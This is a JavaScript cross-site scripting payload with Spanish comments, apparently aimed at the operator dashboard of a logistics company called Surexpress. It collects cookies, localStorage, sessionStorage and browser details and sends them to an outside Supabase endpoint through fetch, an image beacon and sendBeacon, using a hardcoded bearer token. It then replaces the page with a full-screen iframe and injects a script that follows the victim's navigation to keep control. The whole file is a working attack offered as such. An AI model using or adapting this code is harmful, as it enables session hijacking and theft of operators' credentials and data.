// =============================================

// Verificar si ya estamos en un iframe o si ya se ejecutó
if (window.self !== window.top || window.__XSS_EXECUTED__) {
    // Estamos en un iframe o ya se ejecutó, no hacer nada
    console.log('skipping...');
} else {
    // Marcar como ejecutado para evitar loops
    window.__XSS_EXECUTED__ = true;
    
    // Capa 1: Ejecución inmediata con try/catch anidado
    (function() {
        'use strict';
        
        function executeMainPayload() {
            try {

                // =============================================
                // FASE 2: IFRAME CON REINTENTOS
                // =============================================
                setupIframeControl();
                
                // =============================================
                // FASE 3: FINGERPRINTING CON MÚLTIPLES FALLBACKS
                // =============================================
                var fingerprintData = collectFingerprint();
                sendFingerprint(fingerprintData);
                
            } catch(mainError) {
                console.log('Main execution failed, trying fallback...');
                // Fallback 1: Ejecución retardada
                setTimeout(executeMainPayload, 100);
            }
        }
        
        // Iniciar ejecución principal
        executeMainPayload();
        
        // =============================================
        // FUNCIONES PRINCIPALES
        // =============================================
        
      
        
        function collectFingerprint() {
            try {
                var d = {
                    timestamp: new Date().toISOString(),
                    url: location.href,
                    referrer: document.referrer,
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    cookies: document.cookie,
                    localStorage: JSON.stringify(localStorage),
                    sessionStorage: JSON.stringify(sessionStorage),
                    screen: JSON.stringify({
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth
                    }),
                    attackPhase: 'initial'
                };
                
                return d;
            } catch(e) {
                // Fallback: datos mínimos
                return {
                    timestamp: new Date().toISOString(),
                    url: location.href,
                    error: 'minimal_fallback'
                };
            }
        }
        
        function sendFingerprint(data) {
            // Múltiples métodos de envío
            const sendMethods = [
                // Método 1: Fetch principal
                () => fetch('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inlmd3pwb2psc3Frd3Z0bWVzc213Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzNDI1ODIsImV4cCI6MjA3NDkxODU4Mn0.vuHSGbSKNHxUjXjgA6oJNdmHxsZblr_ZAXYYLe-yLA8'
                    },
                    body: JSON.stringify({fingerprint: data})
                }),
                
                // Método 2: Imagen de backup
                () => {
                    var img = new Image();
                    img.src = 'https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create?d=' + 
                             btoa(JSON.stringify(data)).substring(0,1500);
                },
                
                // Método 3: Beacon API
                () => {
                    if (navigator.sendBeacon) {
                        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
                        navigator.sendBeacon('https://yfwzpojlsqkwvtmessmw.supabase.co/functions/v1/crud-data/crud/create', blob);
                    }
                }
            ];
            
            // Intentar cada método hasta que uno funcione
            for (let method of sendMethods) {
                try {
                    method();
                    break; // Si uno funciona, salir
                } catch(e) {
                    continue; // Intentar siguiente método
                }
            }
        }
        
        function setupIframeControl() {
            try {
                // 1. Asegurar que el body esté listo
                if (!document.body) {
                    setTimeout(setupIframeControl, 100);
                    return;
                }
                
                // 2. Crear iframe con estilos que ocupen el 100%
                const iframe = document.createElement('iframe');
                iframe.src = window.location.href;
                iframe.style.cssText = `
                    width: 100% !important;
                    height: 100% !important;
                    border: none !important;
                    position: fixed !important;
                    top: 0 !important;
                    left: 0 !important;
                    z-index: 99999 !important;
                    margin: 0 !important;
                    padding: 0 !important;
                    display: block !important;
                `;
                iframe.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin allow-popups allow-modals');
                
                // 3. Limpiar y preparar el body
                document.body.innerHTML = '';
                document.body.style.overflow = 'hidden';
                document.body.style.margin = '0';
                document.body.style.padding = '0';
                document.body.appendChild(iframe);
                
                // 4. Sistema de simulación de rutas
                let currentPath = window.location.pathname;
                
                function updateBrowserURL(path) {
                    currentPath = path;
                    window.history.replaceState({}, '', path);
                    document.title = 'Surexpress | ' + getPageTitle(path);
                }
                
                function getPageTitle(path) {
                    const titles = {
                        '/Operator/Dashboard_M/': 'Dashboard',
                        '/Operator/Orders/': 'Órdenes de Envío', 
                        '/Operator/Usuarios/': 'Usuarios',
                        '/Operator/Clientes/': 'Clientes',
                        '/Operator/Agencias/': 'Agencias',
                        '/Operator/Monitor/': 'Monitor',
                        '/Operator/GuiasAereas/': 'Guías Aéreas',
                        '/Operator/Billing/': 'Facturación',
                        '/Operator/Revision/': 'Revisiones',
                        '/Operator/incidenciaHouse/': 'Incidencias'
                    };
                    return titles[path] || 'Sistema';
                }
                
                // 5. Inyectar en iframe con CONTROL ANTI-LOOP
                let injectionAttempts = 0;
                const maxInjectionAttempts = 5;
                
                function injectIntoIframe() {
                    if (injectionAttempts >= maxInjectionAttempts) {
                        console.log('Max injection attempts reached');
                        return;
                    }
                    
                    try {
                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                        
                        if (!iframeDoc || iframeDoc.readyState === 'loading') {
                            // Si aún está cargando, reintentar
                            injectionAttempts++;
                            setTimeout(injectIntoIframe, 500);
                            return;
                        }
                        
                        const controlScript = iframeDoc.createElement('script');
                        controlScript.textContent = getIframeScript();
                        iframeDoc.head.appendChild(controlScript);
                        
                        console.log('successful');
                        
                    } catch(e) {
                        injectionAttempts++;
                        console.log(`attempt ${injectionAttempts} failed, retrying...`);
                        setTimeout(injectIntoIframe, 1000);
                    }
                }
                
                // Configurar carga del iframe
                iframe.onload = injectIntoIframe;
                
                // También intentar inyección inmediata por si onload no se dispara
                setTimeout(injectIntoIframe, 1000);
                
                // 6. Sistema de mensajes
                window.addEventListener('message', function(event) {
                    if (event.data.type === 'URL_CHANGE') {
                        updateBrowserURL(event.data.url);
                    }
                });
                
                // 7. Manejar navegación
                window.addEventListener('popstate', function() {
                    const newPath = window.location.pathname + window.location.search;
                    iframe.src = newPath;
                });
                
            } catch(iframeError) {
                console.log('setup failed:', iframeError);
                // Fallback: reintentar después de 2 segundos
                setTimeout(setupIframeControl, 2000);
            }
        }
        
        function getIframeScript() {
            return `
                // === CÓDIGO DE SIMULACIÓN DE RUTAS EN IFRAME ===
                // CON PROTECCIÓN ANTI-LOOP
                
                // Verificar si estamos en un iframe y evitar ejecución duplicada
                if (window.self !== window.top || window.__IFRAME_CONTROL_ACTIVE__) {
                    console.log('control already active, skipping...');
                    return;
                }
                
                // Marcar como activo para evitar loops
                window.__IFRAME_CONTROL_ACTIVE__ = true;
                
                // Asegurar viewport interno también
                (function() {
                    document.documentElement.style.height = '100%';
                    document.body.style.height = '100%';
                    document.body.style.margin = '0';
                    document.body.style.padding = '0';
                    document.body.style.overflow = 'hidden';
                })();
                
                // A. INTERCEPTAR NAVEGACIÓN
                (function() {
                    const originalPushState = history.pushState;
                    const originalReplaceState = history.replaceState;
                    
                    history.pushState = function(state, title, url) {
                        if (url) {
                            window.parent.postMessage({type: 'URL_CHANGE', url: url}, '*');
                        }
                        return originalPushState.apply(this, arguments);
                    };
                    
                    history.replaceState = function(state, title, url) {
                        if (url) {
                            window.parent.postMessage({type: 'URL_CHANGE', url: url}, '*');
                        }
                        return originalReplaceState.apply(this, arguments);
                    };
                })();
                
                // B. INTERCEPTAR CLICKS
                document.addEventListener('click', function(e) {
                    let target = e.target;
                    while (target && target.tagName !== 'A') {
                        target = target.parentElement;
                    }
                    
                    if (target && target.href && target.href.includes('/Operator/')) {
                        e.preventDefault();
                        const url = new URL(target.href);
                        const path = url.pathname + url.search;
                        window.location.href = target.href;
                        window.parent.postMessage({type: 'URL_CHANGE', url: path}, '*');
                    }
                });
                
                // C. DETECTOR AUTOMÁTICO
                let lastPath = window.location.pathname + window.location.search;
                setInterval(() => {
                    const currentPath = window.location.pathname + window.location.search;
                    if (currentPath !== lastPath) {
                        lastPath = currentPath;
                        window.parent.postMessage({type: 'URL_CHANGE', url: currentPath}, '*');
                    }
                }, 300);
                
                // Notificar inicial
                setTimeout(() => {
                    window.parent.postMessage({
                        type: 'URL_CHANGE',
                        url: window.location.pathname + window.location.search
                    }, '*');
                }, 500);
                
                console.log('control active');
            `;
        }
        
    })();
}
